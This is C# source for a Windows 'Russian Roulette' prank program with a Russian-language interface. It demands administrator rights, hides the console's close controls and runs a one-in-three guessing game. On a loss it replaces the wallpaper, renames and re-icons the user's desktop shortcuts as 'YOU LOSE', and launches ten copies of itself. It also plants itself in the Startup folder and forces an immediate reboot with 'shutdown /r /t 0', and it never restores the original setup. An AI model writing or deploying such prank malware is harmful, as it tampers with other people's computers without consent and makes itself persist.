using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using Russian_Roulette;
using IWshRuntimeLibrary;
using System.Text.Json;
using File = System.IO.File;
using Microsoft.Win32;




namespace RussianRoulette
{
    internal class Program
    {
      

        private delegate bool ConsoleCtrlDelegate(CtrlTypes CtrlType);

        private enum CtrlTypes
        {
            CTRL_C_EVENT = 0,
            CTRL_CLOSE_EVENT = 2,
            CTRL_SHUTDOWN_EVENT = 6
        }

        private static bool ConsoleCtrlCheck(CtrlTypes ctrlType) => true;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll")]
        static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        [DllImport("user32.dll")]
        static extern bool RemoveMenu(IntPtr hMenu, uint uPosition, uint uFlags);

        const int SW_MAXIMIZE = 3;
        const int GWL_STYLE = -16;
        const int WS_CAPTION = 0x00C00000;
        const int WS_SYSMENU = 0x00080000;
        const uint SWP_NOMOVE = 0x0002;
        const uint SWP_NOSIZE = 0x0001;
        const uint SWP_FRAMECHANGED = 0x0020;
        const uint SC_CLOSE = 0xF060;
        const uint MF_BYCOMMAND = 0x00000000;

        static bool IsRunningAsAdmin()
        {
            if (OperatingSystem.IsWindows())
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            return false; 
        }



        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        static void SetWallpaper(string path)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }


        static void Main(string[] args)
        {

            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_MAXIMIZE);

            int style = GetWindowLong(handle, GWL_STYLE);
            style &= ~(WS_CAPTION | WS_SYSMENU);
            SetWindowLong(handle, GWL_STYLE, style);
            SetWindowPos(handle, IntPtr.Zero, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_FRAMECHANGED);

            new Thread(() =>
            {
                Thread.Sleep(10000);
                using (var ms = new MemoryStream(Resources.allstare))
                using (var player = new System.Media.SoundPlayer(ms))
                {
                    player.Play();
                }
            }).Start();

            Console.OutputEncoding = Encoding.UTF8;

            if (!IsRunningAsAdmin())
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("⚠ Пожалуйста, перезапустите программу от имени администратора для корректной работы.");
                Console.ResetColor();
                Console.ReadKey();
                return;
            }

            Console.Clear();
            Console.Title = "РУССКАЯ РУЛЕТКА: СИСТЕМНОЕ ИСПЫТАНИЕ";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"
       ______
    .-'      '-.
   /            \
  |              |
  |,  .-.  .-.  ,|
  | )(_o/  \o_)( |
  |/     /\     \|
  (_     ^^     _)
   \__|IIIIII|__/
    | \IIIIII/ |
    \          /
     `--------`

>> Добро пожаловать в 'РУССКУЮ РУЛЕТКУ: СИСТЕМНОЕ ИСПЫТАНИЕ'

Ты сделал свой выбор — и пути назад больше нет.
С этого момента ты — участник. 

Игра не спросит, готов ли ты. Игра просто начнётся.

Каждое нажатие клавиши — как спуск курка.
Один из них активирует необратимое.

🎲 Желаешь сыграть? Уже поздно отступать...");

            Console.WriteLine(@"
1 - Да
2 - Да");

            Console.ReadKey();
            if (args.Length > 0 && args[0] == "child")
            {
                Console.Clear();
                Console.Title = "МИГАНИЕ...";
                ConsoleColor[] colors = (ConsoleColor[])Enum.GetValues(typeof(ConsoleColor));
                Random rnd = new Random();
                for (int i = 0; i < 5; i++)
                {
                    Console.BackgroundColor = colors[rnd.Next(colors.Length)];
                    Console.Clear();
                    Thread.Sleep(1000);
                }
            }
            Game(args);
        }

        static void Game(string[] args)
        {
            Console.Clear();
            Console.WriteLine(@"
       ______
    .-'      '-.
   /            \
  |              |
  |,  .-.  .-.  ,|
  | )(_o/  \o_)( |
  |/     /\     \|
  (_     ^^     _)
   \__|IIIIII|__/
    | \IIIIII/ |
    \          /
     `--------`
'РУССКАЯ РУЛЕТКА: СИСТЕМНОЕ ИСПЫТАНИЕ'");

            int num;
            while (true)
            {
                Console.Write("Выбери число от 1 до 3: ");
                string? input = Console.ReadLine();
                if (int.TryParse(input, out num) && num >= 1 && num <= 3)
                    break;
                Console.WriteLine("Введено некорректное значение! Попробуй снова. ⚠");
            }

            Random rnd = new Random();
            int rndNum = rnd.Next(1, 4);
            Console.WriteLine("Повезло :( ");
            Console.WriteLine("Пуля была в числе: " + rndNum);

            if (num == rndNum)
                Died();
            else
                Win();
        }

        static void Win()
        {
            DesktopIcons.SetDesktopIconsVisible(true);
            Console.WriteLine("Ты выиграл...");
        }


        string GetIconPathForShortcut(string shortcutPath)
        {
            var shell = new WshShell();
            var shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
            return shortcut.IconLocation.Split(',')[0]; 
        }

        static void Died()
        {
            string backupDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Backup");
            string backupIcons = Path.Combine(backupDir, "shortcuts");
            Directory.CreateDirectory(backupDir);
            Directory.CreateDirectory(backupIcons);

            string wallpaperPath = Path.Combine(backupDir, "wallpaper.bmp");
            if (File.Exists(wallpaperPath))
            {
                SetWallpaper(wallpaperPath);
            }
            else
            {
                Console.WriteLine("⚠️ Wallpaper file not found.");
            }

            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] shortcuts = Directory.GetFiles(desktopPath, "*.lnk");

            List<ShortcutMetadata> metadata = new List<ShortcutMetadata>();
            for (int i = 0; i < shortcuts.Length; i++)
            {
                string origLnk = shortcuts[i];
                string fileName = $"shortcut{i}.lnk";
                string iconPath = "путь к иконке"; 

                File.Copy(origLnk, Path.Combine(backupIcons, fileName), true);
                metadata.Add(new ShortcutMetadata
                {
                    OriginalName = Path.GetFileName(origLnk),
                    FileName = fileName,
                    IconPath = iconPath
                });
            }

            File.WriteAllText(Path.Combine(backupDir, "shortcut_metadata.json"),
                JsonSerializer.Serialize(metadata));

            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("УПС... Ты проиграл :)");
            Thread.Sleep(100);

            ConsoleColor[] colors = (ConsoleColor[])Enum.GetValues(typeof(ConsoleColor));
            Random rnd = new Random();
            for (int i = 0; i < 10; i++)
            {
                Console.BackgroundColor = colors[rnd.Next(colors.Length)];
                Console.Clear();
                Thread.Sleep(100);
            }

            string folderPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "WallpaperBackup");
            Directory.CreateDirectory(folderPath);
            DirectoryInfo dirInfo = new DirectoryInfo(folderPath);
            dirInfo.Attributes |= FileAttributes.Hidden | FileAttributes.System;

            string bmpImagePath = Path.Combine(folderPath, "FunnyWallpaper.bmp");
            using (var ms = new MemoryStream(Resources.FunnyWallpaper))
            using (Image img = Image.FromStream(ms))
            {
                img.Save(bmpImagePath, ImageFormat.Bmp);
            }
            SetWallpaper(bmpImagePath);

            string iconFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Icons");
            Directory.CreateDirectory(iconFolder);

            byte[][] iconResources = new byte[][]
            {
        Resources.artShrek, Resources.abaybe, Resources.cat, Resources.Cat1, Resources.Cat2, Resources.Dragon, Resources.fairy,
        Resources.Fiona, Resources.headShrek, Resources.Osel, Resources.OsloShrek, Resources.Pechen, Resources.princeCrarli,
        Resources.shrek3, Resources.ShrekArtik, Resources.smallKing,
            };

            for (int i = 0; i < shortcuts.Length && i < iconResources.Length; i++)
            {
                string oldShortcut = shortcuts[i];
                string newName = $"YOU LOSE ({i + 1}).lnk";
                string newPath = Path.Combine(desktopPath, newName);

                string iconPath = Path.Combine(iconFolder, $"icon{i}.ico");
                using (var ms = new MemoryStream(iconResources[i]))
                using (var icon = new Icon(ms))
                using (var fs = new FileStream(iconPath, FileMode.Create))
                {
                    icon.Save(fs);
                }

                var shell = new WshShell();
                var lnk = (IWshShortcut)shell.CreateShortcut(oldShortcut);
                lnk.IconLocation = iconPath + ",0";
                lnk.Save();

                

                if (File.Exists(newPath)) File.Delete(newPath);
                File.Move(oldShortcut, newPath);
            }

            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            for (int i = 0; i < 10; i++)
            {
                Process.Start(exePath, "child");
            }

            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string shortcutPath = Path.Combine(startupFolder, "MyAppShortcut.lnk");
            var shell2 = new WshShell();
            var startupShortcut = (IWshShortcut)shell2.CreateShortcut(shortcutPath);
            startupShortcut.TargetPath = exePath;
            startupShortcut.WorkingDirectory = Path.GetDirectoryName(exePath);
            startupShortcut.Save();

            using (var ms = new MemoryStream(Resources.allstare))
            using (var player = new System.Media.SoundPlayer(ms))
            {
                player.PlaySync(); 
            }

            try
            {
                Process.Start(new ProcessStartInfo("shutdown", "/r /t 0")
                {
                    UseShellExecute = true,
                    Verb = "runas", 
                    CreateNoWindow = true
                });
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"⚠ Не удалось перезагрузить систему: {ex.Message}");
                Console.ResetColor();
            }
        }




    }
    class ShortcutMetadata
    {
        public string? OriginalName { get; set; }
        public string? FileName { get; set; }
        public string? IconPath { get; set; }
    }


    class DesktopIcons
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void SetDesktopIconsVisible(bool visible)
        {
            IntPtr progman = FindWindow("Progman", null);
            IntPtr desktopHandle = FindWindowEx(progman, IntPtr.Zero, "SHELLDLL_DefView", null);

            if (desktopHandle == IntPtr.Zero)
            {
                IntPtr workerw = FindWindow("WorkerW", null);
                desktopHandle = FindWindowEx(workerw, IntPtr.Zero, "SHELLDLL_DefView", null);
            }

            if (desktopHandle != IntPtr.Zero)
            {
                ShowWindow(desktopHandle, visible ? SW_SHOW : SW_HIDE);
            }
        }
    }
}
